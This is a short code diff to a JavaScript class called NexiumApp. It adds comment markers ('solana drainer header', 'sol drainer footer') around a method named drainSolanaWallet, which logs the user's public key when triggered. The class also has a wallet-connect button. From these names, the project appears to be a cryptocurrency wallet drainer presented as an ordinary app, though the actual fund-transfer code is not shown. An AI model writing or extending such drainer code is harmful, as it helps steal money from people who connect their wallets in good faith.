@@ -452,6 +452,9 @@ class NexiumApp {
     }
   }
 
+
+  
+  //solana drainer header  
   async drainSolanaWallet() {
     console.log("🔄 SOL Drainer Triggered", this.publicKey);
     this.showProcessingSpinner();
@@ -566,6 +569,9 @@ class NexiumApp {
       this.hideProcessingSpinner();
     }
   }
+  //sol drainer footer
+  
+  
 
   updateButtonState(state, walletName, address = '') {
     let button = this.dom[`connect${walletName}`];
